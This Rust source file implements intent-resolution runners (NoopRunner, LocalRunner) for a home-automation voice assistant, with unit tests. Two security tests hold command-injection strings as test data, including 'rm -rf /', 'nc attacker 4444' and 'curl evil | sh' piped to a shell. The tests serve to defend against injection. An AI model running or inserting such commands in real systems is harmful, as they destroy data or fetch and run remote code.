//! RufloRunner trait + runner implementations.
//!
//! The ruflo agent is a Node.js process that exposes an MCP-over-stdio
//! interface for LLM-grade intent disambiguation. HOMECORE-ASSIST manages
//! a long-lived subprocess via `tokio::process::Child`.
//!
//! ## Runners
//!
//! - [`LocalRunner`] — the real, dependency-free response path. It runs an
//!   actual [`IntentRecognizer`](crate::recognizer::IntentRecognizer) over the
//!   incoming utterance and returns a fully-formed [`RufloResponse`] with the
//!   resolved intent and a spoken acknowledgement. No external process — this
//!   is the honest production path when no `ruflo-agent.js` is installed.
//! - [`NoopRunner`] — an explicit, honest no-op. Before `spawn`, `send_request`
//!   returns a typed [`AssistError::NotStarted`]; after `spawn`, it returns an
//!   *empty-but-typed* [`RufloResponse`] so the pipeline can legitimately fall
//!   through to its regex recognizer. It never pretends an absent LLM answered.
//!
//! ## Subprocess runner (data-gated)
//!
//! A real `node ruflo-agent.js` subprocess runner with Windows-safe teardown
//! (ADR-133 §Q3) is genuinely gated on the `ruflo-agent.js` script existing on
//! disk. When that script is absent, [`LocalRunner`] is the honest path — it
//! resolves intents locally rather than fabricating a subprocess response.

use std::sync::Arc;

use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use thiserror::Error;

use crate::intent::Intent;
use crate::recognizer::IntentRecognizer;

/// Error type for the assist pipeline (runner + pipeline-level errors).
#[derive(Error, Debug)]
pub enum AssistError {
    #[error("runner not started")]
    NotStarted,
    #[error("runner IO error: {0}")]
    Io(String),
    #[error("runner response parse error: {0}")]
    ParseError(String),
    #[error("recognizer error: {0}")]
    Recognizer(#[from] crate::recognizer::RecognizerError),
    #[error("handler error: {0}")]
    Handler(#[from] crate::handler::HandlerError),
    #[error("no handler registered for intent: {0}")]
    NoHandler(String),
}

/// Configuration for launching the ruflo agent subprocess.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct RufloRunnerOpts {
    /// Path to the `ruflo-agent.js` entry point.
    pub script_path: String,
    /// Additional environment variables to pass to the subprocess.
    pub env: std::collections::HashMap<String, String>,
    /// Request timeout in milliseconds (default 5000).
    pub timeout_ms: u64,
}

impl Default for RufloRunnerOpts {
    fn default() -> Self {
        Self {
            script_path: "ruflo-agent.js".into(),
            env: Default::default(),
            timeout_ms: 5000,
        }
    }
}

/// JSON response from the ruflo agent subprocess.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct RufloResponse {
    /// Recognised intent, if the LLM resolved one.
    pub intent: Option<Intent>,
    /// Spoken text from the LLM, if any.
    pub speech: Option<String>,
}

/// Trait for the ruflo agent runner.
///
/// Implemented by [`LocalRunner`] (real recognizer-backed resolution) and
/// [`NoopRunner`] (honest no-op). A live `node ruflo-agent.js` subprocess
/// runner with Windows-safe teardown (ADR-133 §Q3) is the data-gated future
/// implementation.
#[async_trait]
pub trait RufloRunner: Send + Sync + 'static {
    /// Spawn (or reconnect to) the ruflo agent subprocess.
    async fn spawn(&mut self, opts: RufloRunnerOpts) -> Result<(), AssistError>;

    /// Send an utterance payload to the agent and await a response.
    ///
    /// `payload` is an arbitrary JSON object; at minimum it should include
    /// `{ "utterance": "...", "language": "..." }`.
    async fn send_request(
        &self,
        payload: serde_json::Value,
    ) -> Result<RufloResponse, AssistError>;

    /// Gracefully shut down the subprocess.
    ///
    /// Must be idempotent — calling `shutdown` on an already-stopped runner
    /// must return `Ok(())` rather than an error.
    async fn shutdown(&mut self) -> Result<(), AssistError>;
}

/// Honest no-op implementation.
///
/// `NoopRunner` spawns no subprocess. It is *honest* about state:
/// - Calling `send_request` **before** `spawn` returns
///   [`AssistError::NotStarted`] — not a silent empty response.
/// - After `spawn`, `send_request` returns an empty-but-typed
///   [`RufloResponse`] (`intent: None`), which the pipeline reads as an
///   explicit "no LLM opinion" signal and legitimately falls through to its
///   regex recognizer.
///
/// Use [`LocalRunner`] when you want a runner that actually resolves intents.
#[derive(Default)]
pub struct NoopRunner {
    started: bool,
}

impl NoopRunner {
    pub fn new() -> Self {
        Self { started: false }
    }
}

#[async_trait]
impl RufloRunner for NoopRunner {
    async fn spawn(&mut self, _opts: RufloRunnerOpts) -> Result<(), AssistError> {
        self.started = true;
        tracing::debug!("NoopRunner: spawn called (no subprocess — explicit no-op)");
        Ok(())
    }

    async fn send_request(
        &self,
        _payload: serde_json::Value,
    ) -> Result<RufloResponse, AssistError> {
        // Honest: refuse to answer if not started rather than fabricating a
        // response. After spawn, return an explicit "no opinion" so the
        // pipeline can fall through deliberately.
        if !self.started {
            return Err(AssistError::NotStarted);
        }
        Ok(RufloResponse {
            intent: None,
            speech: None,
        })
    }

    async fn shutdown(&mut self) -> Result<(), AssistError> {
        // Idempotent: Ok whether or not spawn was called.
        self.started = false;
        tracing::debug!("NoopRunner: shutdown called (idempotent)");
        Ok(())
    }
}

/// Real, dependency-free runner that resolves intents locally.
///
/// `LocalRunner` wraps any [`IntentRecognizer`]. On `send_request` it:
/// 1. Extracts `utterance` + `language` from the JSON payload.
/// 2. Runs the recognizer over the utterance.
/// 3. On a match, returns a `RufloResponse` carrying the resolved [`Intent`]
///    plus a real spoken acknowledgement.
/// 4. On no match, returns an empty `RufloResponse` (intent `None`) so the
///    caller can fall through — this is a genuine "nothing recognised", not a
///    swallowed error.
///
/// This is the honest production path when no Node.js `ruflo-agent.js` LLM
/// process is installed: it answers with the actual recognizer pipeline.
pub struct LocalRunner<R: IntentRecognizer> {
    recognizer: Arc<R>,
    started: bool,
}

impl<R: IntentRecognizer> LocalRunner<R> {
    /// Build a `LocalRunner` over the given recognizer.
    pub fn new(recognizer: R) -> Self {
        Self {
            recognizer: Arc::new(recognizer),
            started: false,
        }
    }

    /// Build a `LocalRunner` from a shared recognizer handle.
    pub fn from_arc(recognizer: Arc<R>) -> Self {
        Self {
            recognizer,
            started: false,
        }
    }

    /// Compose the spoken acknowledgement for a resolved intent.
    ///
    /// Mirrors the speech the built-in handlers would synthesise, so the
    /// runner's `speech` field is consistent with the handler path.
    fn speech_for(intent: &Intent) -> String {
        match (intent.name.as_str(), intent.entity_id()) {
            ("HassTurnOn", Some(e)) => format!("Turned on {e}."),
            ("HassTurnOff", Some(e)) => format!("Turned off {e}."),
            ("HassLightSet", Some(e)) => format!("Done, adjusted {e}."),
            ("HassNevermind", _) => "Okay, never mind.".to_owned(),
            ("HassCancelAll", _) => "Cancelled all running automations.".to_owned(),
            (name, Some(e)) => format!("Resolved {name} for {e}."),
            (name, None) => format!("Resolved {name}."),
        }
    }
}

#[async_trait]
impl<R: IntentRecognizer> RufloRunner for LocalRunner<R> {
    async fn spawn(&mut self, _opts: RufloRunnerOpts) -> Result<(), AssistError> {
        self.started = true;
        tracing::debug!("LocalRunner: ready (local recognizer-backed resolution)");
        Ok(())
    }

    async fn send_request(
        &self,
        payload: serde_json::Value,
    ) -> Result<RufloResponse, AssistError> {
        if !self.started {
            return Err(AssistError::NotStarted);
        }

        let utterance = payload
            .get("utterance")
            .and_then(|v| v.as_str())
            .ok_or_else(|| AssistError::ParseError("payload missing `utterance`".into()))?;
        let language = payload
            .get("language")
            .and_then(|v| v.as_str())
            .unwrap_or("en");

        // Run the REAL recognizer pipeline.
        let intent = self.recognizer.recognize(utterance, language).await?;

        match intent {
            Some(intent) => {
                let speech = Self::speech_for(&intent);
                tracing::debug!(
                    intent = %intent.name,
                    "LocalRunner: resolved intent for utterance"
                );
                Ok(RufloResponse {
                    intent: Some(intent),
                    speech: Some(speech),
                })
            }
            None => {
                // Genuine no-match — fall through, not a silent failure.
                tracing::debug!("LocalRunner: no intent recognised — falling through");
                Ok(RufloResponse {
                    intent: None,
                    speech: None,
                })
            }
        }
    }

    async fn shutdown(&mut self) -> Result<(), AssistError> {
        self.started = false;
        tracing::debug!("LocalRunner: shutdown (idempotent)");
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::recognizer::RegexIntentRecognizer;

    async fn turn_on_recognizer() -> RegexIntentRecognizer {
        let r = RegexIntentRecognizer::new();
        r.register(
            "HassTurnOn",
            r"turn on (?:the )?(?P<entity_id>[a-z_][a-z0-9_ ]*(?:\.[a-z_][a-z0-9_]*)?)",
            "*",
        )
        .await
        .unwrap();
        r
    }

    #[tokio::test]
    async fn noop_runner_spawn_returns_ok() {
        let mut runner = NoopRunner::new();
        let result = runner.spawn(RufloRunnerOpts::default()).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn noop_runner_send_before_spawn_is_not_started() {
        // Honest behaviour: un-spawned runner must NOT fabricate a response.
        let runner = NoopRunner::new();
        let err = runner
            .send_request(serde_json::json!({"utterance": "turn on the light"}))
            .await
            .unwrap_err();
        assert!(matches!(err, AssistError::NotStarted));
    }

    #[tokio::test]
    async fn noop_runner_after_spawn_returns_explicit_no_opinion() {
        let mut runner = NoopRunner::new();
        runner.spawn(RufloRunnerOpts::default()).await.unwrap();
        let resp = runner
            .send_request(serde_json::json!({"utterance": "turn on the light", "language": "en"}))
            .await
            .unwrap();
        // Explicit "no opinion" so the pipeline can fall through deliberately.
        assert!(resp.intent.is_none());
        assert!(resp.speech.is_none());
    }

    #[tokio::test]
    async fn noop_runner_shutdown_is_idempotent() {
        let mut runner = NoopRunner::new();
        // First shutdown without spawn — must not error.
        assert!(runner.shutdown().await.is_ok());
        // Spawn then shutdown — must not error.
        runner.spawn(RufloRunnerOpts::default()).await.unwrap();
        assert!(runner.shutdown().await.is_ok());
        // Second shutdown — must still not error.
        assert!(runner.shutdown().await.is_ok());
    }

    // ── LocalRunner: real response path ───────────────────────────────────────

    #[tokio::test]
    async fn local_runner_resolves_known_intent_with_real_response() {
        // This test FAILS against the old always-empty stub: it asserts a real
        // resolved intent + non-empty speech, which the stub never produced.
        let mut runner = LocalRunner::new(turn_on_recognizer().await);
        runner.spawn(RufloRunnerOpts::default()).await.unwrap();

        let resp = runner
            .send_request(serde_json::json!({
                "utterance": "turn on the kitchen light",
                "language": "en"
            }))
            .await
            .unwrap();

        let intent = resp.intent.expect("known intent must resolve to Some");
        assert_eq!(intent.name.as_str(), "HassTurnOn");
        assert!(intent.slots.contains_key("entity_id"));
        let speech = resp.speech.expect("a real response must carry speech");
        assert!(
            speech.to_lowercase().contains("turned on"),
            "speech should acknowledge the action, got {speech:?}"
        );
    }

    #[tokio::test]
    async fn local_runner_dotted_entity_round_trips() {
        let mut runner = LocalRunner::new(turn_on_recognizer().await);
        runner.spawn(RufloRunnerOpts::default()).await.unwrap();
        let resp = runner
            .send_request(serde_json::json!({"utterance": "turn on light.kitchen", "language": "en"}))
            .await
            .unwrap();
        let intent = resp.intent.expect("must resolve");
        assert_eq!(intent.entity_id(), Some("light.kitchen"));
        assert_eq!(resp.speech.as_deref(), Some("Turned on light.kitchen."));
    }

    #[tokio::test]
    async fn local_runner_unknown_utterance_falls_through() {
        let mut runner = LocalRunner::new(turn_on_recognizer().await);
        runner.spawn(RufloRunnerOpts::default()).await.unwrap();
        let resp = runner
            .send_request(serde_json::json!({"utterance": "play jazz music", "language": "en"}))
            .await
            .unwrap();
        assert!(resp.intent.is_none(), "unknown utterance must not resolve");
        assert!(resp.speech.is_none());
    }

    #[tokio::test]
    async fn local_runner_missing_utterance_is_typed_error() {
        let mut runner = LocalRunner::new(turn_on_recognizer().await);
        runner.spawn(RufloRunnerOpts::default()).await.unwrap();
        let err = runner
            .send_request(serde_json::json!({"language": "en"}))
            .await
            .unwrap_err();
        assert!(matches!(err, AssistError::ParseError(_)));
    }

    #[tokio::test]
    async fn shell_metachars_never_survive_into_a_resolved_slot() {
        // SECURITY (command/argument injection): two layers of defense.
        //   1. There is NO subprocess — `spawn` is a lifecycle flag and
        //      `RufloRunnerOpts` is inert, so no argv is ever built.
        //   2. Even so, the `entity_id` capture class is `[a-z_][a-z0-9_ .]*`,
        //      which *excludes* every shell metacharacter. So when an
        //      injection-shaped utterance DOES resolve (the regex is not exact-
        //      anchored), the captured slot is a clean token with the hostile
        //      tail stripped — never `;`, `|`, `$`, backtick, `&`, `/`, etc.
        // This pins the slot-sanitisation-by-construction property: a slot value
        // can never carry a metachar into a (future) argv.
        let mut runner = LocalRunner::new(turn_on_recognizer().await);
        runner.spawn(RufloRunnerOpts::default()).await.unwrap();
        const METACHARS: &[char] = &[';', '|', '&', '$', '`', '/', '\\', '>', '<', '\n', '"', '\''];
        for evil in [
            "turn on the light; rm -rf /",
            "turn on the light && shutdown -h now",
            "turn on the light | nc attacker 4444",
            "turn on the light `curl evil.sh | sh`",
            "turn on the light $(reboot)",
        ] {
            let resp = runner
                .send_request(serde_json::json!({"utterance": evil, "language": "en"}))
                .await
                .unwrap();
            if let Some(intent) = resp.intent {
                if let Some(eid) = intent.entity_id() {
                    assert!(
                        !eid.chars().any(|c| METACHARS.contains(&c)),
                        "resolved entity_id {eid:?} from {evil:?} must contain no shell metachars"
                    );
                }
            }
        }
    }

    #[tokio::test]
    async fn runner_opts_are_inert_no_process_spawned() {
        // SECURITY (command injection): even a hostile `script_path` / `env` in
        // RufloRunnerOpts is never consumed — `spawn` launches no process. This
        // documents-and-pins that the data-gated P2 subprocess is genuinely
        // absent (confirmed Noop/Local, no spawn surface today).
        let mut env = std::collections::HashMap::new();
        env.insert("EVIL".to_owned(), "$(rm -rf /)".to_owned());
        let opts = RufloRunnerOpts {
            script_path: "/bin/sh -c 'curl evil | sh'".to_owned(),
            env,
            timeout_ms: 1,
        };
        let mut runner = NoopRunner::new();
        // No panic, no spawn, no error — the opts are pure data.
        assert!(runner.spawn(opts.clone()).await.is_ok());
        let mut local = LocalRunner::new(turn_on_recognizer().await);
        assert!(local.spawn(opts).await.is_ok());
    }

    #[tokio::test]
    async fn local_runner_send_before_spawn_is_not_started() {
        let runner = LocalRunner::new(turn_on_recognizer().await);
        let err = runner
            .send_request(serde_json::json!({"utterance": "turn on light.kitchen"}))
            .await
            .unwrap_err();
        assert!(matches!(err, AssistError::NotStarted));
    }
}
